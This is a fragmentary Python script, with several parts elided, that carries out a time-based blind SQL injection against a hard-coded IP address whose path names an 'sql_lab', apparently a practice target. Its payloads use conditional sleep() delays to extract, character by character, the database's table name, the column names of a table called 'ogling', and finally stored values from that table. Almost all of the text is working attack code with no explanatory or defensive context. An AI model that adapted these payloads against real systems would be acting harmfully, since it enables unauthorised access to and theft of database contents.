...
def main():
    ...
    url = "http://178.208.95.16/sql_lab/open"
    ...
    # -1") or IF(ascii(substr((SELECT count(*) TABLE_NAME FROM information_schema.TABLES WHERE table_schema=database() LIMIT 0,1),1,1))=49,sleep(3),NULL)-- -
    ...
    for i in range(1, len_of_key + 1):
        ...
        payload = f'-1") or IF(ascii(substr((SELECT TABLE_NAME FROM information_schema.TABLES WHERE table_schema=database() LIMIT 0,1),{i},1))<%s,sleep(4),NULL)-- -  '

        param = dict(visit=payload)
    ...
    '''
    payload = f'-1") or IF(ascii(substr((SELECT count(*) column_name from information_schema.columns WHERE table_name='ogling' AND table_schema=database() limit 0,1),1,1))=50, sleep(5),NULL)-- -'
    ...
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f'-1") or IF(ascii(substr((SELECT concat(column_name) from information_schema.columns WHERE table_name="ogling" limit 1,1),{i},1))<%s, sleep(4),NULL)-- -'
    ...
    # payload = f'-1") or IF(ascii(substring((select count(*) from ogling limit 0,1),1,1))=49, sleep(4),NULL)-- -'
    # 4
    ...
    num_of_requests = 0
    for i in range(1, len_of_key + 1):
        payload = f'-1") or if(ascii(substring((select go from ogling limit 3,1),{i},1))<%s,sleep(4),NULL)-- -'
